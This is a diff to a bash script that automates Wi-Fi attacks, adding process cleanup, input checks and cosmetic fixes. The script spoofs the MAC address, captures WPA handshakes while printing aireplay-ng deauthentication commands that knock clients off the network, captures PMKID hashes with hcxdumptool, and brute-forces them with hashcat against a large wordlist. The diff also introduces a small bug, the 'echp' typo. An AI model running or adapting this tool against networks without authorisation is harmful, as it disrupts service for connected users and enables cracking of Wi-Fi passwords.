@@ -51,23 +51,38 @@ function enable_monitor_mode(){
     airmon-ng check kill &>/dev/null
     echo -e "\n${good}[+]${nc} Processes killed correctly"; sleep 0.5
 
-    echo -e "\n${doing}[~]${nc} Annonymizing MAC address"; sleep 0.5
+    echo -e "\n${doing}[~]${nc} Anonymizing MAC address"; sleep 0.5
     macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
 
     echo -e "\n${good}[+]${nc} New MAC address: $macaddress"; sleep 0.5
+}
+
+function kill_remaining_processes(){
+    kill -9 $(ps aux | grep -i "airodump-ng" | awk '{print $2}') &>/dev/null
+    kill -9 $(ps aux | grep -i "aireplay-ng" | awk '{print $2}') &>/dev/null
+    kill -9 $(ps aux | grep -i "hcxdumptool" | awk '{print $2}') &>/dev/null
 }
 
 function exit_script(){
     if [ "$we_attack" = "0" ]; then
         echo -e "\n${warn}[*]${nc} We are gonna to exit the script..."
         echo -e "\n${info}[·]${nc} Managed mode allows you to navigate into internet and that stuff. If had finished your attacks it's likeable to bring the network back to managed mode."
-        echo -e "\n${info}[·]${nc} If you are cracking some password bring the network card to managed mode, dosen't affect on anything"
+        echo -e "\n${info}[·]${nc} If you are cracking some password bring the network card to managed mode, doesn't affect on anything."
         echo -ne "\n${ask}[?]${nc} Do you want to bring the network back to managed mode? [y/n]: "
         read answer
         if [ "${answer,,}" = "y" ]; then
             enable_managed_mode
         else
             echo -e "\n${yellow}[!]${nc} Leaving network card in monitor mode..."
+        fi
+        echo -e "\n${info}[·]${nc} I specially recommend you to kill the remaining processes if you use a PMKID attack, because I found that hcxdumptool doesn't kill itself for some reason..."
+        echo -e "\n${info}[·]${nc} You could also verify this with the command: ${cmd}ps aux | grep -i \"hcxdumptool\"${nc}"
+        echo -ne "\n${ask}[?]${nc} Do you want to kill remaining processes?[y/n]: "
+        read answer
+        if [ "${answer,,}" = "y" ]; then
+            kill_remaining_processes
+        else
+            echo -e "\n${yellow}[!]${nc} Leaving remaining processes running..."
         fi
     fi
     echo -e "\n${good}[+]${nc} Exiting..."
@@ -90,7 +105,7 @@ function help_panel(){
     echo -e "\t\tmonitor"
     echo -e "\t${doing}h) Help panel"
     echo -e "\tShow this help panel"
-    echo -e "\n\t${grey}Example: $0 -a PMKID${nc}"
+    echo -e "\n\t${cmd}Example: $0 -a PMKID${nc}"
 
     exit_script
 }
@@ -166,7 +181,7 @@ function install_all_missing_dependencies(){
         if [ "$(echo $?)" == "0" ]; then
             echo -e "\n${doing}[~]${nc} Installing $program with $package_manager"
             sleep 2
-            echo -e "${grey}$ sudo $package_manager install $program${nc}"
+            echo -e "${cmd}$ sudo $package_manager install $program${nc}"
             sudo $package_manager install $program -${confirmation} 1>/dev/null
             if [ "$(echo $?)" == "0" ]; then
                 echo -e "${good}[+]${nc} $program has been installed"
@@ -197,7 +212,7 @@ function dependencies(){
     #clear;
     programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)
 
-    echo -e "\n${doing}[~]${nc} Checking dependencies...\n"
+    echo -e "${doing}[~]${nc} Checking dependencies...\n"
     sleep 0.5
 
     installed_programs=()
@@ -333,8 +348,8 @@ function handshake(){
         echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
         echo -e "\n${yellow}[*]${nc} You could wait until the handshake is captured or press ${ask}enter${nc} to continue"
         echo -e "\n${info}[·]${nc} TIP: You can try to see the clients and send the deauth packets to them using aireplay in another terminal: "
-        echo -e "${grey}sudo aireplay-ng -0 5 -a ${ap_bssid} -c client_mac_address ${network_card}"
-        echo -e "${grey}sudo aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"
+        echo -e "${cmd}sudo aireplay-ng -0 5 -a ${ap_bssid} -c client_mac_address ${network_card}"
+        echo -e "${cmd}sudo aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"
         wait_for_confirmation
         tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
         if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
@@ -365,7 +380,7 @@ function handshake(){
         aircrack_xterm_pid=$!
         echo -e "\n${yellow}[*]${nc} Cracking handshake..."
         echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
-        echo -e "\n${yellow}[!]${nc} Use the following command: ${grey}sudo kill -9 $aircrack_xterm_pid${nc}"
+        echo -e "\n${yellow}[!]${nc} Use the following command: ${cmd}sudo kill -9 $aircrack_xterm_pid${nc}"
     fi
 
     rm -rf handshake.txt
@@ -373,13 +388,18 @@ function handshake(){
 }
 
 function pmkid(){
-    echo -ne "${ask}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
-    minutes=$(( minutes * 60 ))
+    #echo -ne "\n${ask}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
+    #minutes=$(( minutes * 60 ))
+    minutes=60
     echo -e "\n${doing}[~]${nc} Start listening at $(date +%H:%M:%S)..."
     xterm -hold -e "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" &
     hcxdumptool_xterm_pid=$!
-    sleep ${minutes}
-    kill -9 $hcxdumptool_xterm_pid; wait $hcxdumptool_xterm_pid &>/dev/null
+    hcxdumptool_hang_process=$(ps aux | grep "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" | grep -v "xterm" | awk '{print $2}')
+    sleep $minutes
+    echo -e "\n${doing}[~]${nc} Stop listening at $(date +%H:%M:%S)..."
+    kill -9 $hcxdumptool_xterm_pid &>/dev/null; wait $hcxdumptool_xterm_pid &>/dev/null
+    sleep 5
+    kill -9 $hcxdumptool_hang_process &>/dev/null; wait $hcxdumptool_hang_process &>/dev/null
     echo -e "\n${doing}[~]${nc} Obtaining hashes..."
     hash_name="hashes_pmkid_$(date +%y_%m_%d_%H_%M).hc22000"
     hcxpcapngtool -o ${hash_name} capture_pmkid 1>/dev/null
@@ -391,13 +411,15 @@ function pmkid(){
     test -f hashes_pmkid/${hash_name}
 
     if [ "$(echo $?)" == "0" ]; then
-
+        echp -e "\n${good}[+]${nc} Hashes obtained"
+        sleep 1
         echo -e "\n${doing}[~]${nc} Initiating brute-force attack..."
         sleep 1
+        echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show the progress of the attack"
         xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlists/kaonashiWPA100M.txt" &
         hashcat_xterm_pid=$!
-        echo -e "\n${yellow}[*]${nc} Remember to kill the process when you finished"
-        echo -e "\n${info}[·]${nc} Use the following command: ${grey}sudo kill -9 $hashcat_xterm_pid${nc}"
+        echo -e "\n${yellow}[*]${nc} Remember to kill this terminal when the cracking were finished"
+        echo -e "\n${info}[·]${nc} Use the following command: ${cmd}sudo kill -9 $hashcat_xterm_pid${nc}"
     else
         echo -e "\n${wrong}[!]${nc} The hashes are not captured :("
 
@@ -435,9 +457,13 @@ function choose_card(){
     echo -e "\n${ask}[?]${nc} Choose a network card: "
     PS3="Network card: "
     select network_card in $(ifconfig | awk '{print $1}' | grep : | sed 's/://'); do
-        echo -e "\n${good}[+]${nc} You choose ${network_card}\n"
-        sleep 1
-        break
+        if [[ -z $network_card ]]; then
+            echo -e "\n${wrong}[-]${nc} Invalid option"
+        else
+            echo -e "\n${good}[+]${nc} You choose ${network_card}\n"
+            break
+            sleep 1
+        fi
     done
     we_attack=0
 }
